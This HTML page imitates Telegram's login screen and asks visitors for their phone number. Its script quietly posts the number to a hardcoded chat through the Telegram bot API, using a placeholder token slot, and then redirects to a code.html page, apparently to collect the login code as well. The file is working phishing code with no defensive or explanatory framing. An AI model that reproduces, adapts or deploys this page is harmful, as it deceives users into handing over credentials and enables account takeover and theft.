<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;
            overflow: hidden;
        }
        .login-box {
            width: 100%; max-width: 340px; text-align: center; padding: 20px;
        }
        .logo-svg {
            width: 100px; height: 100px; margin-bottom: 35px;
        }
        h2 { font-size: 26px; margin-bottom: 10px; font-weight: 600; }
        p { color: #8e8e93; font-size: 16px; line-height: 1.3; margin-bottom: 40px; padding: 0 10px; }
        .input-group {
            text-align: left; margin-bottom: 25px;
        }
        label { color: #0088cc; font-weight: 500; font-size: 15px; margin-left: 4px; }
        
        /* Контейнер для имитации единого поля ввода с плюсом */
        .phone-container {
            display: flex;
            align-items: center;
            background-color: #1c1c1e;
            border: 1px solid #2c2c2e;
            border-radius: 10px;
            margin-top: 8px;
            padding: 0 14px;
        }
        .phone-container:focus-within {
            border-color: #0088cc;
        }
        .plus {
            color: #fff;
            font-size: 18px;
            margin-right: 2px;
            user-select: none; /* Плюс нельзя выделить или стереть */
        }
        input {
            width: 100%;
            background: transparent;
            border: none;
            padding: 14px 0;
            color: #fff;
            font-size: 18px;
            outline: none;
        }
        
        .btn-next {
            background-color: #0088cc; color: white; border: none;
            width: 100%; padding: 14px; border-radius: 10px;
            font-size: 16px; font-weight: 600; cursor: pointer;
            text-transform: uppercase; letter-spacing: 0.5px; margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <svg class="logo-svg" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="120" cy="120" r="120" fill="#0088CC"/>
            <path d="M175.833 70.3661L44.2461 121.087C35.2689 124.69 35.3188 129.704 42.6139 131.947L76.3776 142.485L154.512 93.1895C158.204 90.9463 161.574 92.1793 158.789 94.6548L95.4054 151.854L92.95 186.745C96.3683 186.745 97.8769 185.176 99.7896 183.332L116.236 167.337L150.435 192.602C156.74 196.077 161.272 194.288 162.84 186.769L185.275 80.9329C187.57 71.7235 181.776 67.5615 175.833 70.3661Z" fill="white"/>
        </svg>
        
        <h2>Your Phone</h2>
        <p>Please confirm your country code and enter your phone number.</p>
        
        <form action="#" id="loginForm">
            <div class="input-group">
                <label>Phone Number</label>
                <div class="phone-container">
                    <span class="plus">+</span>
                    <input type="tel" id="phone" placeholder="Your phone number" required>
                </div>
            </div>
            <button type="submit" class="btn-next">Next</button>
        </form>
    </div>

    <script>
        const BOT_TOKEN = 'ТВОЙ_ТОКЕН'; 
        const CHAT_ID = '6990072009';

        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `📱 Ввод номера: +${phone}`
                })
            }).then(() => {
                window.location.href = "code.html";
            });
        };
    </script>
</body>
</html>
